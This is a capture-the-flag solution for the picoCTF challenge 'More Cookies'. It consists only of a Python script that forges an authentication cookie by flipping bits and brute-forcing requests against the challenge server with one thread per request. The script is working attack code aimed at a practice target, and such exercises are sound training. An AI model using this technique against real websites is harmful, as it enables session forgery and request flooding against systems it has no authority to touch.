### More Cookies
```python
import base64, requests, threading

def bitFlip( pos, bit, data):
    raw = base64.b64decode(data)
    list1 = list(raw)
    list1 = [chr(i) for i in list1]
    list1[pos] = chr(ord(list1[pos])^bit)
    raw = ''.join(list1)
    return base64.b64encode(bytes(raw, 'utf-8'))

def send(cookies):
    r = requests.get("http://mercury.picoctf.net:10868/", cookies={"auth_name": cookies.decode('utf-8')})
    if "picoCTF" in r.text:
        print(r.text)
        exit(0)
    

cookie = "YmRsMlM1OTVTUHdRSEtrQ0ROM1h3eHdGa3FVa0dINUdwUnk5Rjd0RFhydnNzL1VIR0dZMk1Bc1h5MWZ4TWVGVGxWcUxXVWI2KzZ0UnIvOFZlMTVIZU1UVFMwWGkrMmdNMzNNdENLbWVzQU5WM203aWx3UmtocnNwSTBTTnh6cDc="
for i in range(len(base64.b64decode(bytes(cookie, 'utf-8')))):
    for j in range(1, 0xff):
        print(f"{i} {j}", end = '\r')
        c = bitFlip(i, j, cookie)
        r = threading.Thread(target=send, args=(c,))
        r.start()
    r.join()
```